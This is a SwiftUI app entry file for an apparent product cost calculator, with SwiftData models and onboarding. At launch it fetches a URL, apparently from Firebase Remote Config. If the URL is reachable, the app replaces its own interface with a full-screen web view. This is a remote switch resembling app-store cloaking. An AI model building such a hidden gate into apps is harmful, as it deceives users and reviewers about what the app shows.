import SwiftUI
import SwiftData
import Firebase



// Firebase
// 1845
// Android-08-01-26
// Remote Config
// url_1


@main
struct Project_05_02_26_1App: App {
    
    init() {
        FirebaseApp.configure()
    }
    
    @State private var showSplash = true
    @State private var showError = false
    
    @State private var resolvedPath: String?
    @State private var loadState: PreferenceLoadState = .loading
    @State private var flowState: AppFlowState = .splashScreen
    
    var sharedModelContainer: ModelContainer = {
        let schema = Schema([
            Material.self,
            Labor.self,
            Product.self,
            Ingredient.self,
            AppSettings.self,
            // New models
            CurrencySettings.self,
            PriceHistory.self,
            Supplier.self,
            ProductTemplate.self,
            ProductNote.self,
            UserPreferences.self
        ])
        let modelConfiguration = ModelConfiguration(
            schema: schema,
            isStoredInMemoryOnly: false
        )
        
        do {
            return try ModelContainer(for: schema, configurations: [modelConfiguration])
        } catch {
            fatalError("Could not create ModelContainer: \(error)")
        }
    }()
    
    var body: some Scene {
        WindowGroup {
            
            ZStack {
                switch flowState {
                case .splashScreen:
                    SplashScreenView()

                case .mainInterface:
                    RootView()

                case .webView(let path):
                    if let url = URL(string: path) {
                        EmbeddedWebView(targetUrl: url.absoluteString)
                            .edgesIgnoringSafeArea(.all)
                    } else {
                        Text("Неверный URL")
                    }

                case .errorMessage(let message):
                    VStack(spacing: 20) {
                        Text("Ошибка")
                            .font(.title)
                            .foregroundColor(.red)
                        Text(message)
                        Button("Повторить") {
                            Task { await fetchConfigurationAndNavigate() }
                        }
                    }
                    .padding()
                }
            }
            .task {
                await fetchConfigurationAndNavigate()
            }
            .onChange(of: loadState, initial: true) { _, newValue in
                if case .success = newValue, let path = resolvedPath, !path.isEmpty {
                    Task {
                        await verifyAndNavigate(path: path)
                    }
                }
            }
            
            // RootView()
        }
        .modelContainer(sharedModelContainer)
    }
    
    
    private func fetchConfigurationAndNavigate() async {
        await MainActor.run { flowState = .splashScreen }
        
        let (path, state) = await PreferenceLoader.shared.loadPreferences()
        
        await MainActor.run {
            self.resolvedPath = path
            self.loadState = state
        }
        
        if path == nil || path?.isEmpty == true {
            navigateToMainInterface()
        }
    }
    
    private func navigateToMainInterface() {
        withAnimation {
            flowState = .mainInterface
        }
    }
    
    private func verifyAndNavigate(path: String) async {
        guard let url = URL(string: path) else {
            navigateToMainInterface()
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10
        
        do {
            let (_, response) = try await URLSession.shared.data(for: request)
            
            if let http = response as? HTTPURLResponse,
               (200...299).contains(http.statusCode) {
                await MainActor.run {
                    flowState = .webView(path)
                }
            } else {
                navigateToMainInterface()
            }
        } catch {
            navigateToMainInterface()
        }
    }
}

/// Root view that handles onboarding and main content
struct RootView: View {
    @Environment(\.modelContext) private var modelContext
    @Query private var userPreferences: [UserPreferences]
    
    @State private var showOnboarding = false
    @State private var isInitialized = false
    
    private var hasCompletedOnboarding: Bool {
        userPreferences.first?.hasCompletedOnboarding ?? false
    }
    
    var body: some View {
        Group {
            if !isInitialized {
                // Loading state
                ProgressView()
                    .onAppear {
                        initializeApp()
                    }
            } else if showOnboarding {
                OnboardingView {
                    withAnimation {
                        showOnboarding = false
                    }
                }
            } else {
                ContentView()
            }
        }
    }
    
    private func initializeApp() {
        // Initialize default data
        initializeDefaultData()
        
        // Check onboarding status
        if !hasCompletedOnboarding {
            showOnboarding = true
        }
        
        isInitialized = true
    }
    
    private func initializeDefaultData() {
        // Check if Labor settings exist
        let laborDescriptor = FetchDescriptor<Labor>()
        let laborCount = (try? modelContext.fetchCount(laborDescriptor)) ?? 0
        
        if laborCount == 0 {
            let defaultLabor = Labor(hourlyRate: 15.0)
            modelContext.insert(defaultLabor)
        }
        
        // Check if AppSettings exist
        let settingsDescriptor = FetchDescriptor<AppSettings>()
        let settingsCount = (try? modelContext.fetchCount(settingsDescriptor)) ?? 0
        
        if settingsCount == 0 {
            let defaultSettings = AppSettings()
            modelContext.insert(defaultSettings)
        }
        
        // Check if UserPreferences exist
        let prefsDescriptor = FetchDescriptor<UserPreferences>()
        let prefsCount = (try? modelContext.fetchCount(prefsDescriptor)) ?? 0
        
        if prefsCount == 0 {
            let defaultPrefs = UserPreferences()
            modelContext.insert(defaultPrefs)
        }
        
        try? modelContext.save()
    }
}
